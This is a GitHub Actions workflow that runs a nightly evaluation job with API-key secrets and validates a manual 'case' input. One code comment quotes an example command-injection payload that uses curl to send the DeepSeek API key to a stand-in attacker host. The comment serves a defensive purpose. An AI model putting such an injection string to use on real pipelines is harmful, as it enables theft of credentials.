name: Nightly Eval

on:
  schedule:
    # 03:17 UTC daily — off the :00 mark so we don't pile onto the same hour boundary.
    - cron: "17 3 * * *"
  workflow_dispatch:
    inputs:
      case:
        description: "Single case name to run (empty = all)"
        required: false
        default: ""
      refresh_snapshots:
        description: "Refresh Exa snapshots before scoring"
        type: boolean
        default: false

concurrency:
  group: nightly-eval
  cancel-in-progress: false

jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    env:
      DATABASE_URL: ${{ secrets.EVAL_DATABASE_URL }}
      DIRECT_URL:   ${{ secrets.EVAL_DATABASE_URL }}
      EXA_API_KEY:  ${{ secrets.EVAL_EXA_API_KEY }}
      DEEPSEEK_API_KEY: ${{ secrets.EVAL_DEEPSEEK_API_KEY }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v6
        with:
          node-version: 24
          cache: npm

      - name: Install
        run: npm ci

      - name: Generate Prisma client
        run: npx prisma generate

      - name: Run eval
        id: eval
        env:
          # Pass workflow_dispatch inputs via env vars so they never enter the
          # shell script via ${{ }} interpolation — that's a command-injection
          # vector (`"; curl attacker.com/exfil?key=$DEEPSEEK_API_KEY #`).
          EVAL_CASE: ${{ inputs.case }}
          EVAL_REFRESH_SNAPSHOTS: ${{ inputs.refresh_snapshots }}
        run: |
          ARGS=()
          if [ -n "$EVAL_CASE" ]; then
            # Validate: case names are always [a-z0-9-]+ in golden-queries.json.
            if ! printf '%s' "$EVAL_CASE" | grep -Eq '^[a-z0-9-]+$'; then
              echo "::error::Invalid case name: must match ^[a-z0-9-]+$"
              exit 2
            fi
            ARGS+=(--case "$EVAL_CASE")
          fi
          if [ "$EVAL_REFRESH_SNAPSHOTS" = "true" ]; then
            ARGS+=(--refresh-snapshots)
          fi
          npm run eval -- "${ARGS[@]}" > eval-report.json
        continue-on-error: true

      - name: Upload report
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: eval-report-${{ github.run_id }}
          path: eval-report.json
          retention-days: 30

      - name: Fail job if eval failed
        if: steps.eval.outcome == 'failure'
        run: |
          echo "::error::Eval reported regressions. See artifact."
          exit 1
